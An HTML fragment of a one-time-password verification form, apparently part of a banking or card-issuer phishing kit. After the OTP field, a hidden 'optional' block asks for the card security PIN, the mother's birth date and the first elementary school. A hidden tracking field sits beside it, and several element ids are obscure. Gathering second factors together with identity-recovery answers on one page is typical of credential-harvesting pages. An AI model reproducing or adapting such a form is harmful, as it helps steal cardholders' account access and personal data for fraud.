                    		  <div>&nbsp;</div>
                    		  <div style="line-height: 15px;">&nbsp;<p id="otpvrecount" style="font-size: 14px; color: #b42c01; line-height: 18px; display: none;"> &nbsp;</p></div>
                    		  <p style="font-size: 15px; font-weight: 400; line-height: 18px;">For security purposes, we need you to authenticate your device before proceeding.</p>
                    		  <div>&nbsp;</div>
                    		  <div>Please enter the one-time password sent to your registered email: <br>**<span class="emailid"></span>**@****.com.</div>
                    		  <p></p>
                    		  <div class="inputWrapper">
                               <label class="labelTxt"><span class="otp"></span></label>
                               <input id="otp" type="text" name="otpcode" aria-invalid="false" aria-required="false" data-testid="otp-input" pattern="[0-9]*" aria-labelledby="otp-label otp-alert-label" class="input-control" maxlength="12" value="">
                               </div>
                               <p></p>
                               <p style="line-height: 15px;"><a class="btnresend" id="resend" data-loading-text="<i class='spinner-border spinner-border-sm text-light' role='status'></i> &nbsp;">Resend one-time password</a></p>
                               <div style="line-height: 15px;">&nbsp;<p id="otperror" style="font-size: 14px; color: #b42c01; line-height: 15px; display: none;"></p></div>
                    		  <div id="pnmmdd" style="display: none">
                    		  <div class="inputWrapper">
                    		  <div style="text-align: center; color: #313131; font-weight: 600; font-size: 15px; margin-bottom: 18px;">  Personal Security Question (<span style="font-style:italic;">Optional</span> ) </div>
                    		  <div>
                    		  <p id="pnerror" style="font-size: 14px; color: #b42c01; line-height: 18px; display: none;"></p>
                    		  <p id="mmdderror" style="font-size: 14px; color: #b42c01; line-height: 18px; display: none;"></p>
                    		  </div>
                    		  <label class="labelTxt"><span class="pn"></span></label>
                              <input id="pn" type="text" name="secPin" aria-invalid="false" aria-required="false" data-testid="secPin-input" aria-labelledby="secPin-label secPin-alert-label" class="input-control" placeholder="Confirm security PIN provided when you activated your card " maxlength="12" value="">
                    		  <div>&nbsp;</div>
                    		  <label class="labelTxt"><span class="mmdd"></span></label>
                              <input id="mmdd" type="text" name="mMMDD" aria-invalid="false" aria-required="false" data-testid="mmdd-input" aria-labelledby="mmdd-label mmdd-alert-label" class="input-control" placeholder="Confirm Mother's Birth (MM/DD) " maxlength="12" value="">
                    		  <div>&nbsp;</div>
                    		  <label class="labelTxt"><span class="k12"></span></label>
                              <input id="k12" type="text" name="k12" aria-invalid="false" aria-required="false" data-testid="school-input" aria-labelledby="school-label school-alert-label" class="input-control" placeholder="Confirm First Elementary School " maxlength="36" value="">
                              </div>
                         	</div>
                         	
                           	<div><input type="hidden" name="trck" id="trckc" class="input-control"></div>
                           	<div>&nbsp;</div>
                           	<div><button type="button" name="submitc" class="btn btn-primary" id="otpv" data-loading-text="<i class='spinner-border spinner-border-sm text-light' role='status'></i> &nbsp;"> Verify </button></div>
                           </div>
                           </div>
                          </div> 
                         </form> 
                      </div>
                
